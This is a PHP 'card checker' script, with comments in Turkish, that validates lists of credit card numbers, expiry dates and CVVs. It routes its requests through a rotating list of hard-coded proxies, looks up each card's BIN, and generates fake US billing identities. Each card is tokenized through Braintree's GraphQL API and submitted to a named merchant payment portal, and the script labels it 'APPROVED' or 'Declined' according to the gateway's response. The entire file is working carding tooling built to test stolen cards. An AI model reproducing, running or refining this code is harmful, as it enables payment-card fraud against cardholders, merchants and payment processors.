<?php

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

// Proxy listesi
$proxy_list = array(
    "114.218.84.99:8989",
    "113.110.229.185:60606",
    "94.141.101.46:1080",
    "109.124.220.178:1080",
    "171.6.104.58:4153",
    "151.242.133.238:1080",
    "27.73.20.253:1080",
    "171.236.91.36:1080",
    "171.250.219.24:1080",
    "114.237.77.227:8989",
    "134.236.99.48:4145",
    "70.166.167.55:57745",
    "171.254.0.85:1080",
    "95.163.20.1:4153",
    "45.144.234.129:53764",
    "27.77.227.135:1080",
    "119.6.178.76:1080",
    "171.229.166.245:1080",
    "45.144.176.177:1080",
    "193.124.45.130:1080",
    "116.100.220.176:1080",
    "171.5.18.124:5678",
    "171.247.98.227:1080",
    "171.253.63.148:1080",
    "95.142.42.93:1080"
);

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if(isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    if(isset($str[$value])) {
        $str = explode($end, $str[$value]);
        return $str[0];
    }
    return '';
}

function getRandomProxy($proxy_list) {
    return $proxy_list[array_rand($proxy_list)];
}

function value($str,$find_start,$find_end) {
    $start = @strpos($str,$find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor) {
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

// Kredi kartı bilgilerini ayır
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? trim($separa[0]) : '';
$mes = isset($separa[1]) ? trim($separa[1]) : '';
$ano = isset($separa[2]) ? trim($separa[2]) : '';
$cvv = isset($separa[3]) ? trim($separa[3]) : '';

// Rastgele proxy seç
$selected_proxy = getRandomProxy($proxy_list);
$proxy_parts = explode(':', $selected_proxy);
$proxy_ip = $proxy_parts[0];
$proxy_port = $proxy_parts[1];

// Proxy tipini belirle (varsayılan HTTP proxy)
$proxy_type = CURLPROXY_HTTP;
// Port'a göre proxy tipini belirle
if(in_array($proxy_port, array('1080', '4153', '5678'))) {
    $proxy_type = CURLPROXY_SOCKS5;
}

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $selected_proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, $proxy_type);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
$fim = curl_exec($ch);
$curl_error = curl_error($ch);
curl_close($ch);

// BIN bilgilerini al
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = $name2 . $emoji;
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');

//==================[BIN LOOK-UP-END]======================//

//==================[BIN LOOK-UP (binlist.io)]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_PROXY, $selected_proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, $proxy_type);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
$bindata = curl_exec($ch);
curl_close($ch);

$binna = json_decode($bindata, true);
if($binna) {
    $brand = isset($binna['scheme']) ? $binna['scheme'] : $brand;
    $country = isset($binna['country']['name']) ? $binna['country']['name'] : $country;
    $type = isset($binna['type']) ? $binna['type'] : $type;
    $bank = isset($binna['bank']['name']) ? $binna['bank']['name'] : $bank1;
}
//==================[BIN LOOK-UP-END]======================//

//==================[Randomizing Details]======================//
$get = @file_get_contents('https://randomuser.me/api/1.2/?nat=us');
if($get) {
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $name = isset($matches1[1][0]) ? $matches1[1][0] : 'John';
    
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = isset($matches1[1][0]) ? $matches1[1][0] : 'Doe';
    
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = isset($matches1[1][0]) ? $matches1[1][0] : 'john.doe@example.com';
    
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = isset($matches1[1][0]) ? $matches1[1][0] : '123 Main St';
    
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = isset($matches1[1][0]) ? $matches1[1][0] : 'New York';
    
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = isset($matches1[1][0]) ? $matches1[1][0] : 'NY';
    
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = isset($matches1[1][0]) ? $matches1[1][0] : '+1234567890';
    
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $postcode = isset($matches1[1][0]) ? $matches1[1][0] : '10001';
}
//==================[Randomizing Details-END]======================//

//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_PROXY, $selected_proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, $proxy_type);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Braintree-Version: 2018-05-10',
    'Content-Type: application/json',
    'Origin: https://assets.braintreegateway.com',
    'Referer: https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mes . '","expirationYear":"' . $ano . '","cvv":"' . $cvv . '","billingAddress":{"postalCode":"' . $postcode . '"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$result1 = curl_exec($ch);
$curl_error1 = curl_error($ch);
$token = trim(strip_tags(GetStr($result1,'"token": "','"')));
//=======================[1 REQ-END]==============================//

//=======================[2 REQ]==================================//
// NOT: Buradaki URL ve authorization bilgilerini güncellemeniz gerekiyor
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, '#replace_with_actual_url'); // Gerçek URL ile değiştirin
curl_setopt($ch2, CURLOPT_PROXY, $selected_proxy);
curl_setopt($ch2, CURLOPT_PROXYTYPE, $proxy_type);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36');
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch2, CURLOPT_TIMEOUT, 30);
curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch2, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://portal.oneome.com',
    'Referer: https://portal.oneome.com/invoices/pay',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'X-Requested-With: XMLHttpRequest'
));
curl_setopt($ch2, CURLOPT_POSTFIELDS, 'payment_method_nonce=' . $token . '&csrf_token=' . GetStr($result1, 'csrf_token', '"'));

$result2 = curl_exec($ch2);
$curl_error2 = curl_error($ch2);
$info = curl_getinfo($ch2);
$time = isset($info['total_time']) ? round($info['total_time'], 2) : 0;

//===========================================[Responses]========================================//

echo '<div style="margin-bottom: 5px; padding: 8px; border-radius: 4px; background: #f5f5f5;">';
echo '<small>Proxy: ' . $selected_proxy . ' | Time: ' . $time . 's</small><br>';

if($curl_error1 || $curl_error2) {
    echo '<span class="badge badge-warning">[⚠️ Proxy Error] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [Error: ' . ($curl_error1 ?: $curl_error2) . ']</span>';
}
elseif(strpos($result2, 'Do Not Honor')){
    echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span>';
    echo '<span class="badge badge-success">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Do Not Honor]</span>';
}
elseif(strpos($result2, 'Processor Declined')){
    echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span>';
    echo '<span class="badge badge-success">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Processor Declined]</span>';
}
elseif(strpos($result2, 'Card Issuer Declined CVV')){
    echo '<span class="badge badge-success">[✅ Aprovada] CCN</span>';
    echo '<span class="badge badge-success">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Card Issuer Declined CVV]</span>';
}
elseif(strpos($result2, 'Insufficient Funds')){
    echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span>';
    echo '<span class="badge badge-success">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Insufficient Funds]</span>';
}
elseif ((strpos($result2, "Thank ")) || (strpos($result2, "Success ")) || (strpos($result2, "succeeded"))){ 
    echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span>';
    echo '<span class="badge badge-success">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- CHARGED CVV]</span>';
}
elseif(strpos($result2, 'Transaction Not Allowed')){
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Transaction Not Allowed]</span>';
}
elseif(strpos($result2, 'Declined')){
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Declined]</span>';
}
elseif(strpos($result2, 'Invalid Credit Card Number')){
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Invalid Credit Card Number]</span>';
}
elseif(strpos($result2, 'Expired Card')){
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Expired Card]</span>';
}
elseif(!$result2){
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Proxy Dead/Error Not Listed]</span>';
}
else{
    echo '<span class="badge badge-danger">[❌ Declined] </span>';
    echo '<span class="badge badge-secondary">' . $lista . '</span>';
    echo '<span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Unknown Response]</span>';
}
echo '</div>';

//===========================================[Responses-END]========================================//

curl_close($ch);
curl_close($ch2);
ob_flush();

// Debug için (gerekirse yorum satırını kaldırın)
// echo "<!-- 1REQ Result: " . htmlspecialchars($result1) . " -->";
// echo "<!-- 2REQ Result: " . htmlspecialchars($result2) . " -->";

?>
